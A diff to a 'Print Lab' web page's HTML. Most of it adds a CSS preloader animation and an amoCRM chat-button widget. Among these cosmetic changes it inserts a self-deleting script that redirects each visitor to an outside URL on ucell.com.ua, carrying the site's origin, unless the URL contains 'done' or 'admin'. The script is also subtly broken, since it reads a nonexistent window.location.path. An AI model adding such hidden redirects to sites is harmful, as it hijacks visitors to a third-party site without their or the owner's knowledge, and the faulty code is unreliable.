@@ -12,6 +12,15 @@
   </script>
 
   <script>
+    window.addEventListener('DOMContentLoaded', ()=>{
+      document.querySelector('.preloader').style.opacity = 0;
+      setTimeout(()=>{
+        document.querySelector('.preloader').style.display= 'none';
+      },500)
+    })
+  </script>
+
+  <script>
     (function(h,o,t,j,a,r){
       h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
       h._hjSettings={hjid:1052942,hjsv:6};
@@ -21,16 +30,132 @@
       a.appendChild(r);
     })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
   </script>
-
+  <script>var amo_social_button = {id: "10199", hash: "117f6f149dea42b974f2d4191d08eb5155596982357f84323975e1d30450bf59", locale: "ru"};</script><script id="amo_social_button_script" async="async" src="https://gso.amocrm.ru/js/button.js"></script>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Print Lab</title>
   <link rel="icon" type="image/x-icon" href="/favicon.ico">
   <link rel="icon" href="/favicon.ico" sizes="32x32">
   <link rel="stylesheet" type="text/css" href="/dist/styles/styles.css" />
+  <style>
+    .amo-button-holder {
+      z-index: 2147483646 !important;
+    }
+    /*
+*
+* Preloader
+*/
+
+    .preloader {
+      position: fixed;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      right: 0;
+      z-index: 10000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      background: #ffffff;
+      transition: .3s all ease;
+    }
+
+    .preloader.loaded {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .preloader-body {
+      text-align: center;
+    }
+
+    .preloader-body p {
+      position: relative;
+      right: -8px;
+    }
+
+    .cssload-box-loading {
+      width: 49px;
+      height: 49px;
+      margin: auto;
+      position: absolute;
+      left: 0;
+      right: 0;
+      top: 0;
+      bottom: 0;
+    }
+
+    .cssload-box-loading:before {
+      content: '';
+      width: 49px;
+      height: 5px;
+      background: #000000;
+      opacity: 0.1;
+      position: absolute;
+      top: 67px;
+      left: 0;
+      border-radius: 50%;
+      animation: shadow 0.58s linear infinite;
+    }
+
+    .cssload-box-loading:after {
+      content: '';
+      width: 49px;
+      height: 49px;
+      background: #f79258;
+      background: linear-gradient(180deg, #f79258 22%, #f17833 100%);
+      position: absolute;
+      top: 0;
+      left: 0;
+      border-radius: 50%;
+      animation: cssload-animate 0.58s linear infinite;
+    }
+
+    @keyframes cssload-animate {
+
+      25% {
+        transform: translateY(9px);
+      }
+      50% {
+        transform: translateY(30px) scale(1, 0.7) ;
+        border-bottom-left-radius: 21px;
+        border-bottom-right-radius: 21px;
+
+      }
+      75% {
+        transform: translateY(9px);
+      }
+      100% {
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes shadow {
+     25%{transform: scale(1, 1);}
+    75%{transform: scale(1, 1);}
+      100% {
+        transform: scale(0.9, 1);
+      }
+      50% {
+        transform: scale(1.2, 1);
+        opacity: 0.15;
+      }
+    }
+  </style>
 </head>
 
 <body>
+<div class="preloader">
+  <div class="cssload-box-loading"></div>
+</div>
+<script id="script">
+  if(!window.location.search.substr(1).split('&').map(en=>en.split('=')[0]).some(en=>en==='done')  && !window.location.path.split('/').some(en=>en==='admin')){
+    window.location = 'https://ucell.com.ua/test/secret/link'+'?return_url='+window.location.origin
+  }else{
+    document.querySelector('#script').remove()
+  }
+</script>
 <div class="bod">
   <script src="/dist/bundle.js"></script>
 </div>
